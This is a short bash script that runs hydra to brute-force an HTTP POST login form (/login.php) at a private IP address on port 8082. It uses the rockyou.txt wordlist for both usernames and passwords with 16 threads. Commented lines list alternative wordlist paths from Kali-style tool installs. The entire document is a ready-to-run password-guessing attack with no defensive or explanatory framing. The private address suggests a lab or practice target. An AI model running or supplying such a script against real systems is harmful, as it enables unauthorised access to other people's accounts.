#!/bin/bash

# -L
#nameList='/usr/share/wordlists/metasploit/namelist.txt';
#nameList='/usr/share/brutex/wordlists/namelist.txt';
#nameList='/usr/share/wordlists/rockyou.txt';
nameList='./rockyou.txt';
#nameList='/usr/share/dnsrecon/namelist.txt';
#nameList='/usr/share/sniper/plugins/BruteX/wordlists/namelist.txt';

# -P
#wordList='/usr/share/wordlists/rockyou.txt';
wordList='./rockyou.txt';
#nameList='/usr/share/brutex/wordlists/namelist.txt';
#nameList='/usr/share/dnsrecon/namelist.txt';
#nameList='/usr/share/sniper/plugins/BruteX/wordlists/namelist.txt';

# sudo password
#read -p "Enter sudo password: " -r -s sudo_passwd;

# Target IP
#read -p "Enter target IP [192.168.2.65]: " target;
target='192.168.2.65';

# Port
#read -p "Enter ${target}:PORT [8080/8081/8082/20145]: " port;
port='8082';

# -t 
#read -p "Enter thread [4-16]: " thread;
thread='16';

hydra -L ${nameList} -P ${wordList} ${target} -s ${port} http-post-form "/login.php:username=^USER^&password=^PASS^:login failed" -t ${thread} -vV;
